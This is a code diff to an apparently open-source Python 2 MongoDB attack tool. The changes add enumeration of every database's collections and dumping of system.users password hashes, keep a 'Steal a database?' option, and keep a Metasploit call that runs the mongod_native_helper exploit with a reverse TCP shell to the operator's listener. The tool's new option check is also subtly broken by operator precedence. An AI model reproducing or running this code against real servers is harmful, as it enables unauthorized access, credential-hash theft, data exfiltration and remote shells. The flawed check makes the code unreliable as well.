@@ -23,6 +23,7 @@ import httplib2
 import urllib
 import pymongo
 import subprocess
+import datetime
 
 #Set a list so we can track whether options are set or not to avoid resetting them in subsequent cals to the options menu.
 global optionSet
@@ -164,7 +165,7 @@ def options():
 			options()
 			
 		elif select == "7":
-			loadPath = raw_input("enter file name to load: ")
+			loadPath = raw_input("Enter file name to load: ")
 			try:
 				fo = open(loadPath,"r" )
 				csvOpt = fo.read()
@@ -174,7 +175,7 @@ def options():
 				webPort = optList[1]
 				uri = optList[2]
 				httpMethod = optList[3]
-				myIp = optList[4]
+				myIP = optList[4]
 				myPort = optList[5]
 			
 				#Set option checking array based on what was loaded
@@ -227,6 +228,8 @@ def netAttacks(target):
 
 		try:
 			conn = pymongo.MongoClient(uri)
+			print "MongoDB authenticated on " + target + ":27017!"
+			mgtOpen = True
 		except:
 			print "something happened."
 			mainMenu()
@@ -237,7 +240,10 @@ def netAttacks(target):
 		#Future rev:  Add web management interface parsing
 		mgtRespCode = urllib.urlopen(mgtUrl).getcode()
 		if mgtRespCode == 200:
-			print "MongoDB web management open at " + mgtUrl + ".  Check this out!"
+			print "MongoDB web management open at " + mgtUrl + ".  No authentication required!"
+		
+		elif mgtRespCode == 401:
+			print "MongoDB web management open at " + mgtUrl + ", authentication required."
 	
 		else:
 			print "Got HTTP " + mgtRespCode + "from " + mgtUrl + "."
@@ -251,11 +257,27 @@ def netAttacks(target):
 		print serverInfo
 
 		print "\n"
-
+		
 		print "List of databases:"
 		dbList = conn.database_names()
 		print "\n".join(dbList)
-
+		print "\n"
+		
+		print "List of collections:"
+		#print "\n"
+		
+		for dbItem in dbList:
+			db = conn[dbItem]
+			colls = db.collection_names()
+			print dbItem + ":"
+			print "\n".join(colls)
+			if 'system.users' in colls:
+				users = list(db.system.users.find())
+				print "Database Users and Password Hashes:"
+				#print dbItem
+				print str(users)
+			#print "\n"
+							
 		stealDB = raw_input("Steal a database? (Requires your own Mongo instance): ")
 		
 		if stealDB == "y" or stealDB == "Y":
@@ -263,13 +285,15 @@ def netAttacks(target):
 			
 		getShell = raw_input("Try to get a shell? (Requrires mongoDB <2.2.4)?")
 		
-		if getShell == "y" or getShell == "Y":
+		if getShell == "y" or getShell == "Y" and optionSet[4] == True and optionSet[5] == True:
 			#Launch Metasploit exploit
 			try:
 				proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(victim) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(myIP) + " LPORT="+ str(myPort) + " E", shell=True)
 			
 			except:
 				print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."
+		else:
+			print "Not all options are defined.  Make sure your IP and reverse shell listener port are set."
 	
 	raw_input("Press enter to continue...")
 	return()
